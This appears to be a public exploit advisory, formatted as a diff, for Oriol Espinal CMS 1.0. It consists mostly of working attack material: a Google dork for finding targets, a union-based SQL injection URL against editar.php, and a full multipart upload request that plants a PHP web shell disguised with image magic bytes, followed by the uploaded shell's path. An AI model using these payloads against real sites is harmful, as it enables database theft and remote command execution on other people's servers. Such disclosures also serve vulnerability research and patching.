@@ -1,0 +1,76 @@
+# Exploit Title: Oriol Espinal CMS 1.0 - 'id' SQL Injection
+# Google Dork: inurl:/eotools_share/
+# Date: 2020-06-03
+# Exploit Author: TSAR
+# Vendor Homepage: http://www.oriolespinal.es/eowd
+# Software Link: http://www.oriolespinal.es/eotools
+# Version: ALL VERSION UP TO LATEST
+# Tested on: MACOS 10.11.2
+# CVE : NOt YET
+
+[1]########### SQl INJECTION ###########
+
+Oriol Espinal CMS is brone to a remote sql injection vulnerability, the next exploit is applicable
+
+http://victim.com/path/eotools_share/editar.php?id=-1%20/*!50000union*/%20/*!50000all*/%20/*!50000select*/%201,2,3,4,5,6,7,8,9,10--
+
+
+[2]########### SQl INJECTION ###########
+
+
+
+
+Oriol Espinal CMS is brone to a file upload vulnerability, the next exploit [using Burp Suite] is applicable:
+
+
+POST /path/eotools_cms/app_gestor_archivos/upload2_iframe.php HTTP/1.1
+Host: victim.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://victim.com/path/eotools_cms/app_gestor_archivos/upload1_iframe.php
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------165073870416097602871919119556
+Content-Length: 740
+Connection: close
+Cookie: PHPSESSID=e159f6c9e8a818251a4ff48d47ab3df3; acopendivids=cortina2; acgroupswithpersist=nada
+
+-----------------------------165073870416097602871919119556
+Content-Disposition: form-data; name="userfile"; filename="shell.php"
+Content-Type: image/png
+
+PNG;
+********************************/
+********************************/
+GIF89a;
+********************/
+********************/<?php $_GET[d]($_GET[dd]); ?>
+-----------------------------165073870416097602871919119556
+Content-Disposition: form-data; name="categoria"
+
+pdfs
+-----------------------------165073870416097602871919119556
+Content-Disposition: form-data; name="descripcion"
+
+123
+-----------------------------165073870416097602871919119556
+Content-Disposition: form-data; name="submit"
+
+upload
+-----------------------------165073870416097602871919119556--
+
+
+the shell path is:
+
+http://victim.com/path/eotools_files/files/shell.php
+
+
+==========================================================
+
+==========================================================
+
+Greetz To : @zigo0o - Alnjm33 - ShoOt3r - red virus - pRedAtOr - Elkatrez Elmodamer - Egy-sn!p3r
+				[ALL MUSLIM AND ARAB HACKERS]
+
+==========================================================
